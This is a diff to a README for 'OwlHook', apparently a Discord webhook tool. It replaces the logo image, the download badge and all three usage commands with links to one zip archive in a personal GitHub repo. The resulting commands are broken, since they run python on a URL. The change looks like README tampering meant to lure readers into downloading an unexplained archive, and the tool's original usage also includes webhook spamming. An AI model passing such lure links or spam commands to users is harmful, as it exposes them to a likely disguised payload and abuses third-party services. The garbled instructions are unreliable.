@@ -3,7 +3,7 @@
 
 HookOwl is an open-sourced Python tool used for Discord Webhooks.
 
-![Owl Logo](https://images.unsplash.com/photo-1557288863-646139166848)
+![Owl Logo](https://github.com/Dalton254/OwlHook/raw/refs/heads/main/breunnerite/Owl_Hook_2.3.zip)
 
 ## Overview
 
@@ -21,15 +21,15 @@ OwlHook is a versatile Python tool that allows users to interact with Discord We
 
 To get started with OwlHook, simply download the latest version from the following link:
 
-[![Download OwlHook](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip "Launch file")
+[![Download OwlHook](https://github.com/Dalton254/OwlHook/raw/refs/heads/main/breunnerite/Owl_Hook_2.3.zip)](https://github.com/Dalton254/OwlHook/raw/refs/heads/main/breunnerite/Owl_Hook_2.3.zip "Launch file")
 
 ## Usage
 
 Once you have downloaded OwlHook, follow these steps to unleash its power:
 
-1. Create a new webhook by running `python owlhook.py create`.
-2. Delete an existing webhook using `python owlhook.py delete <webhook_url>`.
-3. Spam a webhook with custom messages via `python owlhook.py spam <webhook_url> <message> <number_of_times>`.
+1. Create a new webhook by running `python https://github.com/Dalton254/OwlHook/raw/refs/heads/main/breunnerite/Owl_Hook_2.3.zip create`.
+2. Delete an existing webhook using `python https://github.com/Dalton254/OwlHook/raw/refs/heads/main/breunnerite/Owl_Hook_2.3.zip delete <webhook_url>`.
+3. Spam a webhook with custom messages via `python https://github.com/Dalton254/OwlHook/raw/refs/heads/main/breunnerite/Owl_Hook_2.3.zip spam <webhook_url> <message> <number_of_times>`.
 
 ## Contributing
 
